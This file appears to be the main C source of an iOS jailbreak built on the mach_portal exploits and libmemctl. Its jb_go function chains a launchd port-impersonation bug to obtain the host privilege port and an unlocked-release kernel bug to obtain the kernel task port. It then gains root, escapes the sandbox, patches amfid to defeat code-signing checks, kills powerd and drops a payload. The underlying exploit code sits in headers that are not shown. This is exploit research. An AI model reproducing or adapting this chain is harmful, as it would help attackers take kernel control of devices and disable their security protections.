#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include "memctl/core.h"
#include "memctl/kernel.h"
#include "memctl/kernel_call.h"
#include "memctl/kernel_memory.h"
#include "memctl/kernel_slide.h"
#include "memctl/memctl_error.h"
#include "memctl/platform.h"
#include "memctl/process.h"
#include "memctl/symbol_finders.h"

#include "sandbox_escape.h"
#include "kernel_sploit.h"
#include "disable_protections.h"
#include "patch_amfid.h"
#include "drop_payload.h"
#include "unsandboxer.h"
#include "offsets.h"
#include "kernel_memory_helpers.h"

/* CHANGE ME */
// change this to your unique app group id
char* app_group = "group.io.github.bazad.mach_portal";

void memctl_warning(const char* fmt, ...) {
  char buf[16 + strlen(fmt)];
  snprintf(buf, sizeof(buf), "warning: %s\n", fmt);
  va_list ap;
  va_start(ap, fmt);
  vprintf(buf, ap);
  va_end(ap);
}

int jb_go() {
  // do platform detection
  platform_init();
  init_offsets();

  // exploit the urefs saturation bug; target launchd to impersonate a service
  // and get the task port for a root service and use that to get the host_priv port
  // which we need to trigger the kernel bug
  mach_port_t real_service_port, mitm_port;
  mach_port_t host_priv_port = get_host_priv_port(app_group, &real_service_port, &mitm_port);
  
  if (host_priv_port == MACH_PORT_NULL) {
    printf("[-] getting host priv port failed :-( \n");
    exit(EXIT_FAILURE);
  }
  
  printf("[+] got host priv port\n");
  
  // exploit the unlocked release bug to get the kernel task port:
  uint64_t realhost = 0;
  mach_port_t kernel_task_port = get_kernel_task_port(host_priv_port, &realhost);
  
  if (kernel_task_port == MACH_PORT_NULL) {
    printf("[-] failed to get kernel task port\n");
    exit(EXIT_FAILURE);
  }

  printf("[+] got kernel task port!\n");

  // Initialize libmemctl.
  kernel_task = kernel_task_port;
  bool success;
  kernel_memory_init();
  kernel_symbol_finders_init();
  success = kernel_init(NULL);
  assert(success);
  success = kernel_slide_init();
  assert(success);
  success = kernel_init(NULL);
  assert(success);
  printf("[+] kernel is at 0x%llx\n", kernel.base);
  success = kernel_call_init();
  assert(success);
  kernel_memory_init();
  process_init();
  printf("[+] initialized libmemctl\n");

  // get root and leave the sandbox
  disable_protections(host_priv_port, realhost);
  
  // make our host port the priv one - this won't persist across an exec
  // but we fix that in disable_protections() later
  task_set_special_port(mach_task_self(), TASK_HOST_PORT, host_priv_port);
  
  printf("uid: %d\n", getuid());
  
  // fix up the mess we made in launchd
  fix_launchd_after_sandbox_escape(real_service_port, mitm_port);
  
  printf("fixed up launchd, iohideventsystem should work again now\n");
  
  kill_powerd();
  
  printf("killed powerd again so it will talk to the real service\n");
  
  mach_port_t amfid_task_port = get_amfid_task_port();
  patch_amfid(amfid_task_port);
  
  start_bootstrap_unsandboxer();
  
  drop_payload();
  
  return 0;
}
